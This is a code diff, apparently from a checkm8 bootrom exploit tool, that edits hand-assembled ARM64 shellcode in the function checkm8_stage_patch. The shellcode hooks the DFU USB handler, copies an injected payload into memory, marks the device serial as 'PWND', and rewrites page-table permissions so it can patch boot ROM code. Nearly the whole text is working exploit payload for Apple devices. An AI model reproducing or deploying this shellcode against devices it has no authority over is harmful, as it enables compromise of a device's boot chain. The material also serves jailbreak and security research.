@@ -1049,49 +1049,45 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 	}, payload_A9[] = {
 		/* _main: */
 		0xA9BF7BFD, /* stp x29, x30, [sp, #-0x10]! */
-		0x58000620, /* ldr x0, =payload_dest */
-		0x58000643, /* ldr x3, =dfu_handle_request */
+		0x580005A0, /* ldr x0, =payload_dest */
+		0x580005C3, /* ldr x3, =dfu_handle_request */
 		0x91003001, /* add x1, x0, #0xC */
 		0xF9000061, /* str x1, [x3] */
 		0x10FFFF61, /* adr x1, _main */
-		0x58000602, /* ldr x2, =payload_off */
+		0x58000582, /* ldr x2, =payload_off */
 		0x8B020021, /* add x1, x1, x2 */
-		0x58000602, /* ldr x2, =payload_sz */
-		0x58000623, /* ldr x3, =memcpy_addr */
+		0x58000582, /* ldr x2, =payload_sz */
+		0x580005A3, /* ldr x3, =memcpy_addr */
 		0xD63F0060, /* blr x3 */
-		0x58000620, /* ldr x0, =gUSBSerialNumber */
+		0x580005A0, /* ldr x0, =gUSBSerialNumber */
 		/* _find_zero_loop: */
 		0x91000400, /* add x0, x0, #1 */
 		0x39400001, /* ldrb w1, [x0] */
 		0x35FFFFC1, /* cbnz w1, _find_zero_loop */
-		0x100003E1, /* adr x1, PWND_STR */
+		0x10000361, /* adr x1, PWND_STR */
 		0xA9400C22, /* ldp x2, x3, [x1] */
 		0xA9000C02, /* stp x2, x3, [x0] */
-		0x58000540, /* ldr x0, =gUSBSerialNumber */
-		0x58000561, /* ldr x1, =usb_create_string_descriptor */
+		0x580004C0, /* ldr x0, =gUSBSerialNumber */
+		0x580004E1, /* ldr x1, =usb_create_string_descriptor */
 		0xD63F0020, /* blr x1 */
-		0x58000561, /* ldr x1, =usb_serial_number_string_descriptor */
+		0x580004E1, /* ldr x1, =usb_serial_number_string_descriptor */
 		0x39000020, /* strb w0, [x1] */
-		0x58000560, /* ldr x0, =ttbr0_vrom_addr */
-		0xD50343DF, /* msr DAIFSet, #(DAIFSC_IRQF | DAIFSC_FIQF) */
-		0xD5033FDF, /* isb */
+		0x580004E0, /* ldr x0, =ttbr0_vrom_addr */
 		0xF9400001, /* ldr x1, [x0] */
-		0xB24B0421, /* orr x1, x1, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
+		0x9278F421, /* bic x1, x1, #ARM_TTE_BLOCK_APMASK */
 		0xF9000001, /* str x1, [x0] */
 		0xD5033F9F, /* dsb sy */
 		0xD50E871F, /* tlbi alle3 */
 		0xD5033F9F, /* dsb sy */
 		0xD5033FDF, /* isb */
 		0x52BA5002, /* mov w2, #0xD2800000 */
-		0x58000443, /* ldr x3, =patch_addr */
+		0x58000403, /* ldr x3, =patch_addr */
 		0xB9000062, /* str w2, [x3] */
-		0x9249F421, /* bic x1, x1, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
+		0xB2790021, /* orr x1, x1, #ARM_TTE_BLOCK_AP(AP_RONA) */
 		0xF9000001, /* str x1, [x0] */
 		0xD5033F9F, /* dsb sy */
 		0xD50E871F, /* tlbi alle3 */
 		0xD5033F9F, /* dsb sy */
-		0xD5033FDF, /* isb */
-		0xD50343FF, /* msr DAIFClr, #(DAIFSC_IRQF | DAIFSC_FIQF) */
 		0xD5033FDF, /* isb */
 		0xA8C17BFD, /* ldp x29, x30, [sp], #0x10 */
 		0xD65F03C0 /* ret */
@@ -1159,11 +1155,11 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		{ exit_critical_section, 0 },
 		{ ret_gadget, 0 }
 	};
-	uint8_t payload[DFU_MAX_TRANSFER_SZ + sizeof(handle_checkm8_request) + sizeof(A9)];
+	uint8_t payload[DFU_MAX_TRANSFER_SZ + sizeof(A9) + sizeof(handle_checkm8_request)];
 	checkm8_overwrite_t checkm8_overwrite;
 	eclipsa_overwrite_t eclipsa_overwrite;
-	transfer_ret_t transfer_ret;
 	size_t payload_sz, overwrite_sz;
+	transfer_ret_t transfer_ret;
 	void *overwrite;
 	uint64_t reg;
 
